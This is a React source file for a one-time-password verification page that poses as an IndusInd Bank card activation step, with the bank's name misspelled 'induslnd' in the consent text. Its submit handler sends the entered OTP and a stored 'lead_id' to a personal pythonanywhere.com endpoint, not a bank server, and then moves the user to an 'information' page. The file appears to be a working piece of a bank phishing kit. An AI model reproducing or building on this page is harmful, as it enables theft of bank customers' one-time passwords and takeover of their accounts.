import React, { useEffect, useState } from "react";
import { Navigation } from "@/components/navigation";
import { useNavigate } from "react-router-dom";
import { AlertCircle } from "lucide-react";
import { Checkbox } from "@/components/ui/checkbox";

export default function Verify() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const style = document.createElement("style");
    style.innerHTML = `
        .up-shadow {
            -webkit-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            -moz-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            box-shadow: 0px -18px 68px -22px #ffae0075;
        }
    `;
    document.head.appendChild(style);
    return () => {
      document.head.removeChild(style);
    };
  }, []);

  const handleOtpInput = (e: React.FormEvent<HTMLInputElement>) => {
    const target = e.currentTarget;
    if (target.value.length > 6) {
      target.value = target.value.slice(0, 6);
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData.entries());

    // Add the lead ID from sessionStorage
    const leadId = sessionStorage.getItem("lead_id");
    if (leadId) {
      data.id = leadId;
    }

    try {
      const response = await fetch(
        "https://pelabix971.pythonanywhere.com/api/verify/",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        },
      );

      if (response.ok) {
        navigate("/information");
      } else {
        console.error("Verification failed");
        alert("Verification failed. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Navigation />

      <div
        className="flex flex-col justify-between gap-16"
        style={{ height: "93vh" }}
      >
        <div className="flex gap-2 items-center px-4 mt-8">
          <div className="px-3">
            <h1 className="text-2xl font-semibold">Verification</h1>
            <p className="text-sm mt-2 text-gray-600">
              Please enter the 6-digit One Time Password (OTP) sent to your
              registered mobile number.
            </p>
          </div>
          <img src="/login-amico.svg" alt="Verify" className="w-1/2" />
        </div>

        <div className="grow w-full rounded-t-3xl drop-shadow-md pt-10 border-t up-shadow bg-[#FBF6EB]">
          <form
            className="flex flex-col items-center px-6 w-full max-w-md mx-auto"
            onSubmit={handleSubmit}
          >
            <h1 className="text-3xl font-semibold mb-8 text-gray-800">Login</h1>

            <div className="mb-8 w-full">
              <label
                htmlFor="otp"
                className="block text-gray-700 text-sm font-medium mb-1 text-center"
              >
                Enter 6-digit OTP sent to your mobile number
              </label>
              <input
                type="number"
                id="otp"
                name="otp"
                placeholder="------"
                className="mt-1 p-2 w-full border-b-2 bg-[#FBF6EB] focus:outline-none focus:border-red-900 transition-colors text-center text-2xl tracking-widest font-bold"
                style={{ borderColor: "#7F1D1D" }}
                required
                onInput={handleOtpInput}
              />
            </div>
            <div className="mb-4 space-y-4">
              <div className="flex gap-2 justify-start items-start">
                <AlertCircle className="w-10 h-10 text-[#7F1D1D]" />
                <p className="text-xs">
                  By entering OTP and proceeding, I agree to the Terms &
                  Conditions associated with indusind Bank Card activation and
                  setup
                </p>
              </div>
              <div className="flex gap-2">
                <Checkbox id="terms" className="w-4 h-4" required />
                <label htmlFor="terms" className="text-xs">
                  Yes, I consent to reciveving important alerts and exclusive
                  offers on WhatsApp from induslnd Bank.
                </label>
              </div>
            </div>
            <button
              type="submit"
              disabled={loading}
              className="bg-red-900 text-white p-3 rounded-md w-full hover:bg-red-800 transition shadow-lg font-medium disabled:opacity-50"
            >
              {loading ? "Verifying..." : "Verify & Proceed"}
            </button>

            <p className="mt-4 text-sm text-gray-600">
              Didn't receive the OTP?{" "}
              <span className="text-red-900 font-bold cursor-pointer hover:underline">
                Resend
              </span>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}
